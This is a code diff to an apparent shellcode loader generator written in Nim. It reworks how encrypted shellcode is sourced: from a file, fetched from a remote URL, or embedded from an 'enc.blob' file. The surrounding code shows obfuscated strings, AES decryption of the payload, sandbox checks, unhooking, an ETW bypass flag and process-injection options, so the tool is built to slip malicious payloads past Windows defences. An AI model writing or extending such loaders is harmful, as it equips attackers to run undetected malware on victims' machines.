@@ -1039,6 +1039,8 @@ let ShellcodeFromFileStub * = fmt"""
         except:
             when defined(verbose):
                 echo obf("[-] Failed to open file: ") & f
+    var enctext: seq[byte] = toByteSeq(encstring)
+    var dectext = newSeq[byte](len(enctext))
 
 """
 
@@ -1348,13 +1350,12 @@ let ShellcodeFromURLStub * = fmt"""
             return dataBuffer.readAll()
 
     var encString = httpGetRequest(obf("{shellcodeURL}"))
+    var enctext: seq[byte] = toByteSeq(encstring)
+    var dectext = newSeq[byte](len(enctext))
+    
 
 """
 
-let ShellcodeDefaultStub * = fmt"""
-    const encstring = slurp"enc.blob"
-
-"""
 
 let Cryptstub1 = """
 import winim/lean
@@ -1475,6 +1476,10 @@ var envkey = obf("{firstwithoutlast4}")
 var envkey2 = envkey
 var ptrEncText: ptr byte
 var ptrDecText: ptr byte
+when defined(PayloadEmbedded):
+    const encstring = slurp"enc.blob"
+    var enctext: seq[byte] = toByteSeq(encstring)
+    var dectext = newSeq[byte](len(enctext))
 """
 
 let Cryptstub2 = fmt"""
@@ -1482,8 +1487,6 @@ let Cryptstub2 = fmt"""
     var success: BOOL
     when defined(sleepinbetween):
         var sleepbetweentime: int = {sleepinbetween}
-
-    var enctext: seq[byte] = toByteSeq(encstring)
     discard calcHard()
     var key: array[aes256.sizeKey, byte]
     discard calcHard()
@@ -1507,7 +1510,7 @@ let Cryptstub3 = fmt"""
 
         moveMemory(addr key[0], addr expandedkey[0], len(expandedkey))
         discard calcHard()
-        var dectext = newSeq[byte](len(enctext))
+        #dectext = newSeq[byte](len(enctext))
 
         var ptrKey = cast[ptr byte](addr key[0])
 
@@ -2115,8 +2118,6 @@ if (retrieveFromFile):
     stub.add(ShellcodefromFileStub)
 elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
-else:
-    stub.add(ShellcodeDefaultStub)
 
 # Only decrypt when sandbox Checks/Unhooking/Sleep is done
 stub.add(getRandStub())
@@ -2399,6 +2400,13 @@ elif system.hostOS == "linux":
 
 if((existingprocessInjection == false) and (remoteinject)):
     basicCompileFlags.add("-d:spawninject ")
+
+if (retrieveFromFile):
+    stub.add(ShellcodefromFileStub)
+elif (retrieveFromURL):
+    stub.add(ShellcodefromURLStub)
+else:
+    basicCompileFlags.add("-d:PayloadEmbedded ")
 
 if(ETW):
     basicCompileFlags.add("-d:HardwareETW ")
